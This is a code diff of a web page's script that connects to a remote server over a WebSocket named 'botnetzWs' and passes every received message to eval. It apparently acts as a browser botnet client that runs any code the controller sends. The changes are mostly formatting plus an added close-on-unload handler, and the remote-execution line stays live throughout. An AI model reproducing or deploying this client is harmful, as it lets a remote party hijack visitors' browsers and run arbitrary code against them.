@@ -14,23 +14,26 @@
 			botnetzWs = new WebSocket(wsUri);
 			output = document.getElementById("div_output");
 			
-			botnetzWs.onopen = function(){
-											writeToScreen("Connected");
-										 }
-			botnetzWs.onmessage = function(evt){
-													eval(evt.data);											
-											   };
-			botnetzWs.onerror = function(evt){
-												writeToScreen("ERROR: " + evt.data);
-											 };
-		}
+			botnetzWs.onopen = function()
+							   {
+									writeToScreen("Connected");
+							   }; // end function
+			botnetzWs.onmessage = function(evt)
+								  {
+								  		eval(evt.data);											
+								  }; //end function
+			botnetzWs.onerror = function(evt)
+								{
+								 	writeToScreen("ERROR: " + evt.data);
+								}; //end function
+		}//end function init
 		
 		function sendText()
 		{
 			text_toSend = document.getElementById("text_toSend").value;
 			botnetzWs.send(text_toSend);
 			writeToScreen("Sent this: " + text_toSend);
-		}
+		}//end function sendText
 		
 		function writeToScreen(message)
 		{
@@ -38,9 +41,15 @@
 		    pre.style.wordWrap = "break-word";
 		    pre.innerHTML = message;
 		    output.appendChild(pre);
-		}
+		}//end function writeToScreen
+		
+		function close()
+		{
+			botnetzWs.close();
+		}//end function close
 		
 		window.addEventListener("load", init, false);
+		window.addEventListener("unload", close, false);
 	</script>
 </head>
 <body>
